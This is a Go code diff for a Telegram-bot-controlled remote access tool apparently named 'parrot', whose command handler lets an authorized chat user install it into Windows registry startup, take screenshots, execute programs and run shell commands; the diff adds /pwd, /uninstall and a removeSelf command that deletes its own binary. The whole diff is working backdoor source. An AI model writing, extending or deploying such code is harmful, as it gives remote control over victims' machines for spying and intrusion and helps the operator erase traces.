@@ -14,10 +14,11 @@ func (t Telegraphist) HandleCommand(update tgbotapi.Update) {
 	log.Printf("[%s] %s", update.Message.From.UserName, update.Message.Text)
 	if update.Message.IsCommand() {
 		command := update.Message.Command()
-		if !t.authenticatedUsers[update.Message.From.ID] && command != "authorize" {
+		if !t.authenticatedUsers[update.Message.From.ID].authenticated && command != "authorize" {
 			t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "You are not authorized, use /authorize <code> to authorize yourself"))
 			return
 		}
+		user := t.authenticatedUsers[update.Message.From.ID]
 		switch command {
 		case "help":
 			msg := tgbotapi.NewMessage(update.Message.Chat.ID, "")
@@ -28,12 +29,18 @@ func (t Telegraphist) HandleCommand(update tgbotapi.Update) {
 				"/end - removes you from memory",
 				"/install - installs parrot and adds it to registry startup",
 				"/screen - takes a commands",
+				"/pwd - shows current path",
 				"/exec - executes a program in local context",
 				"/cmd - runs a command (Be careful about using quotes)",
 			}, "\n")
 			_, err := t.bot.Send(msg)
 			if err != nil {
 				log.Println(err)
+			}
+		case "pwd":
+			_, err := t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, user.currentPath))
+			if err != nil {
+				fmt.Println(err)
 			}
 		case "install":
 			ok, err := commands.Install(os.Args[0])
@@ -44,6 +51,40 @@ func (t Telegraphist) HandleCommand(update tgbotapi.Update) {
 				t.ReportError("Something went wrong :(", update.Message.Chat.ID)
 			} else {
 				t.ReportError("Success :)", update.Message.Chat.ID)
+			}
+		case "uninstall":
+			ok, err := commands.Uninstall()
+			if err != nil {
+				_, err = t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, fmt.Sprintf("Something went wrong: %v", err)))
+				if err != nil {
+					fmt.Println(err)
+				}
+				return
+			}
+			if !ok {
+				_, err = t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "Something bad has happened :("))
+				if err != nil {
+					fmt.Println(err)
+				}
+				return
+			}
+			_, err = t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "Success :)"))
+			if err != nil {
+				fmt.Println(err)
+			}
+
+		case "removeSelf":
+			err := os.Remove(os.Args[0])
+			if err != nil {
+				_, err = t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, fmt.Sprintf("Something went wrong: %v", err)))
+				if err != nil {
+					fmt.Println(err)
+				}
+			} else {
+				_, err = t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "Success :)"))
+				if err != nil {
+					fmt.Println(err)
+				}
 			}
 		case "screen":
 			img, err := commands.TakeScreenShot()
@@ -98,7 +139,7 @@ func (t Telegraphist) HandleCommand(update tgbotapi.Update) {
 		case "authorize":
 			inCode := strings.Join(strings.SplitAfter(update.Message.Text, "/authorize ")[1:], "")
 			if inCode == settings.AuthorizationCode {
-				t.authenticatedUsers[update.Message.From.ID] = true
+				t.authenticatedUsers[update.Message.From.ID] = User{authenticated: true, currentPath: getDirPath(os.Args[0])}
 				_, err := t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "Code correct :)"))
 				if err != nil {
 					log.Println(err)
@@ -123,4 +164,9 @@ func (t Telegraphist) HandleCommand(update tgbotapi.Update) {
 			}
 		}
 	}
+}
+
+func getDirPath(p string) string {
+	i := strings.LastIndex(p, "\\")
+	return p[:i+1]
 }
